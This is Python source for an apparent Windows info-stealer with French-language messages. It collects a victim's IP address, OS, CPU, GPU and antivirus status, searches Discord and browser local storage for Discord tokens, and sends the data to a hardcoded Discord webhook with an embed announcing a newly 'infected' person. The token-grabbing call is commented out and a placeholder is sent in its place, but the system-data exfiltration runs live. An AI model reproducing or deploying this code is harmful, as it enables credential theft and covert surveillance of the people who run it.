from dhooks import Webhook, Embed
import socket
import platform
import GPUtil
import windows_tools.antivirus
import os
if os.name != "nt":
	exit()
from re import findall
from json import loads
from urllib.request import Request, urlopen
import PyInstaller.__main__
name = ["SavePass.py"]


uname = platform.uname()

gpus = GPUtil.getGPUs()

for gpu in gpus:
    gpu_name = gpu.name
    vram = gpu.memoryTotal


def get_os():

    Os = uname.system

    return Os

def get_proces():
    Proces = uname.processor

    return Proces

def get_ip():
    local_ip = socket.gethostbyname(socket.gethostname())

    return local_ip

def get_anti_virus():
    antivirus = windows_tools.antivirus.get_installed_antivirus_software()
    if not antivirus == True:
        return "Aucun anti-virus sur l'ordinateur (sauf Windows Defender)"
    else:
        return antivirus[0]["name"]

    return antivirus

"""Discord information grabber part"""

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
	"Discord"           : ROAMING + "\\Discord",
	"Discord Canary"    : ROAMING + "\\discordcanary",
	"Discord PTB"       : ROAMING + "\\discordptb",
	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
	"Opera GX"			: ROAMING + "\\Opera Software\\Opera GX Stable",
	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
}

def getheaders(token=None, content_type="application/json"):
	headers = {
		"Content-Type": content_type,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
	}
	if token:
		headers.update({"Authorization": token})
	return headers

def getuserdata(token):
	try:
		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
	except:
		pass

def gettokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in findall(regex, line):
					tokens.append(token)
	print(tokens)

#gettokens(PATHS["Discord"])

def webhook_send(webhook):

	hook = Webhook(webhook)

	embed = Embed(
    	description='Une nouvelle personne est infecté! :ballot_box_with_check:',
    	color=0x7831B3,
    	timestamp='now'
    	)

	image1 = 'https://cdn.dribbble.com/users/3856597/screenshots/7566791/media/0621ab4cba0883134adad44b86405ab5.gif'

	embed.set_author(name='Nouveaux soldats', icon_url=image1)
	embed.add_field(name='IP Address', value=get_ip())
	embed.add_field(name='OS Name', value=get_os())
	embed.add_field(name='CPU Name', value=get_proces())
	embed.add_field(name='GPU Name', value=gpu_name)
	embed.add_field(name='VRAM', value=str(vram))
	embed.add_field(name='Anti-Virus', value=get_anti_virus())
	embed.add_field(name='Discord token', value="test")


	embed.set_footer(text='Here is my footer text', icon_url=image1)


	hook.send(embed=embed)


webhook_send("https://discord.com/api/webhooks/909182496585965618/9nStSQhlnENdHgiL0MnoQtaqGl3YUnU5p1R-MbNRJ6tSfySCySHV4lf4Qqma4xEMFMLK")
